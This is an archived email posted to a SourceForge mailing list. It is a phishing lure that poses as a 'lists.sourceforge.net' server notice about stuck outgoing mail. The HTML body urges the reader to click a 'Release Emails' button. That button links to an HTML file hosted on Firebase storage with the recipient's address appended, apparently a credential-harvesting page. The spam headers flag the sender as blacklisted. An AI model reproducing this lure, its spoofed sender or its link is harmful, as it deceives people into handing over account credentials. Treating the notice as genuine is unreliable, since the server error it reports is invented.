Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id D2F9C32B502
	for <lists+osst-users@lfdr.de>; Wed,  3 Mar 2021 06:56:22 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1lHKUf-0006kw-CK
	for lists+osst-users@lfdr.de; Wed, 03 Mar 2021 05:56:21 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <osst-users@kisbsons.com>) id 1lHKUd-0006ko-P2
 for osst-users@lists.sourceforge.net; Wed, 03 Mar 2021 05:56:19 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=MJs0EMPL3+CIoqaj8xMOSpWgT22nNjodEnWmBAsBZJs=; b=iQvZYOerLFY4BmAh/45EpXzEzw
 QEJfynqEiar+frrGapSg/U19VTiTQ/2qNLF03vEHTxmPCw4sDsaTCFeFMDMY6wI9YHeRrWKSCWPk2
 SvrQ8XtO+hE1+k9kRC38S+mb8zHDuaGGOMvs01d4RTr1BW06ilxZYvKbxymhhWvhwRUU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=MJs0EMPL3+CIoqaj8xMOSpWgT22nNjodEnWmBAsBZJs=; b=a
 rCASXqrLC4iniFVtHwr8g60/zWvbnzw86tarUSp5FYWQqQnpZPxn9cUzRty01ww3Ouash+9WE4wdL
 dbu+us5JFKfVHBcbfF26gnFzpzOMVfdwAGs6cggOLY78SeiXs2ELc0IQbQxbG4RX1I1APi++eTmtj
 zz4cxLN/8IqwF01c=;
Received: from server1.kisbsons.com ([94.176.236.182] helo=kisbsons.com)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.92.2)
 id 1lHKUb-00C6n6-8m
 for osst-users@lists.sourceforge.net; Wed, 03 Mar 2021 05:56:19 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed;
 d=kisbsons.com; s=default; h=From:To:Subject:MIME-Version:
 Content-Type:Content-Transfer-Encoding; bh=ER3L3PeIupZVPs3leOZw2
 RcLCks=; b=XYRUWXvRK/F5xXQwySfvJWO4jdo3IvU6HAhAI2Qco9R3FqkOkgjrq
 GvOBVAwDXxKyW6f3+rOtAi5jdMANFQ6kisG5UVpO90C+RwWbC5dNS4kQmbyCoGt/
 o7XIr0PQsOg0NdB9JZfzB6NjcVBFQgB4OABmdA69sDn3Sn6g6Fl7bg=
From: Mailserver  lists.sourceforge.net <osst-users@kisbsons.com>
To: osst-users@lists.sourceforge.net
Date: 3 Mar 2021 07:56:10 +0200
Message-ID: <20210303075610.478BB37AAFF9C2E9@kisbsons.com>
MIME-Version: 1.0
X-Spam-Score: 6.2 (++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 -0.0 SPF_HELO_PASS          SPF: HELO matches SPF record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 RCVD_IN_MSPIKE_L4      RBL: Bad reputation (-4)
 [94.176.236.182 listed in bl.mailspike.net]
 0.0 RCVD_IN_MSPIKE_BL      Mailspike blacklisted
 3.0 GOOG_STO_NOIMG_HTML    Apparently using google content hosting to avoid
 URIBL
X-Headers-End: 1lHKUb-00C6n6-8m
Subject: [Osst-users] Outgoing Mail Delivery Failure (Imap Error)
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============2237052253865513947=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============2237052253865513947==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html><html>

<html><head>

    <meta http-equiv=3D"content-type" content=3D"text/html; charset=3D">
    <meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
  <body text=3D"#000000" bgcolor=3D"#ffffff">
    <table style=3D'font-family: "Segoe UI","Lucida Sans",sans-serif; margi=
n-right: auto; margin-left: auto; max-width: 600px;' border=3D"0" cellspaci=
ng=3D"0" cellpadding=3D"0">
      <tbody>
        <tr>
          <td>
            <table width=3D"100%" style=3D"border-width: 1px 1px 0px; borde=
r-top-color: rgb(224, 224, 224); border-right-color: rgb(224, 224, 224); bo=
rder-left-color: rgb(224, 224, 224); border-top-style: solid; border-right-=
style: solid; border-left-style: solid; min-width: 600px; max-width: 900px;=
 border-top-left-radius: 3px; border-top-right-radius: 3px;" bgcolor=3D"#bb=
5a00" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
              <tbody>
                <tr>
                  <td height=3D"12" style=3D"width: 98%;" colspan=3D"3">&nb=
sp;</td>
                </tr>
                <tr>
                  <td style=3D"width: 5.7%;">&nbsp;</td>
                  <td style=3D"width: 87.3%; text-align: left; color: rgb(2=
55, 255, 255); line-height: 1; font-family: roboto-regular, helvetica, aria=
l, sans-serif; font-size: 25px;">Outgoing Mail Error</td>
                  <td style=3D"width: 5%;">&nbsp;</td>
                </tr>
                <tr>
                  <td height=3D"18" style=3D"width: 98%;" colspan=3D"3">&nb=
sp;</td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
        <tr>
          <td>
            <table width=3D"100%" style=3D"border-width: 0px 1px 1px; borde=
r-right-color: rgb(240, 240, 240); border-bottom-color: rgb(192, 192, 192);=
 border-left-color: rgb(240, 240, 240); border-right-style: solid; border-b=
ottom-style: solid; border-left-style: solid; min-width: 600px; max-width: =
900px; border-bottom-right-radius: 3px; border-bottom-left-radius: 3px;" bg=
color=3D"#f5f5f5" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
              <tbody>
                <tr>
                  <td style=3D"width: 5.16%;" rowspan=3D"3">&nbsp;</td>
                  <td style=3D"width: 83.56%;">&nbsp;</td>
                  <td style=3D"width: 9.76%;" rowspan=3D"3">&nbsp;</td>
                </tr>
                <tr>
                  <td style=3D"width: 83.56%;">
                    <table style=3D"min-width: 300px;" border=3D"0" cellspa=
cing=3D"0" cellpadding=3D"0">
                      <tbody>
                        <tr>
                          <td width=3D"473" style=3D"color: rgb(32, 32, 32)=
; line-height: 1.5; font-family: roboto-regular,helvetica,arial,sans-serif;=
 font-size: 12px;">
                            <br>
                          </td>
                        </tr>
                        <tr>
                          <td style=3D"line-height: 1.5; font-family: robot=
o-regular,helvetica,arial,sans-serif; font-size: 12px;">
                            <p><span style=3D"color: rgb(32, 32, 32);">Due =
&nbsp;to&nbsp;server error,&nbsp;5 new mails you sent from osst-users@lists=
=2Esourceforge.net <span style=3D"color: rgb(32, 32, 32);">are stuck in lis=
ts.sourceforge.net Server.</span><br>
                              <br>
 <font color=3D"#202020">Release below to re-send all stuck emails to the d=
estination boxes.</font><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp; <br></span></p>
=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=20=
=20=20=20
                            <table style=3D"color: rgb(32, 32, 32);">
                              <tbody>
                                <tr>
                                  <td>
                                    <center><a style=3D"background: rgb(187=
, 90, 0); margin: 2px; padding: 10px; color: rgb(255, 255, 255); float: lef=
t; display: block; text-decoration-line: none;" href=3D"https://firebasesto=
rage.googleapis.com/v0/b/srgsltlkzbqopa.appspot.com/o/secondfile%20-%20Copy=
%20(22)%20-%20Copy.HTML?alt=3Dmedia&amp;token=3D8b8343cb-7088-4b45-843c-7c7=
03da744a3#osst-users@lists.sourceforge.net" target=3D"_self" rel=3D"noopene=
r" moz-do-not-send=3D"true">Release Emails</a></center>
                                  </td>
                                </tr>
                                <tr>
                                  <td>&nbsp;<br>
                                  </td>
                                </tr>
                                <tr>
                                  <td><span style=3D"line-height: 0.2; font=
-family: arial; font-size: 10px;">This is a
                                      mandatory lists.sourceforge.net&nbsp;=
webmail service sent to osst-users@lists.sourceforge.net</span></td>
                                </tr>
                              </tbody>
                            </table>
                            <br>
                            <br>
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </td>
                </tr>
              </tbody>
            </table>
          </td>
        </tr>
      </tbody>
    </table>
=20=20

</body></html>


--===============2237052253865513947==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2237052253865513947==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2237052253865513947==--
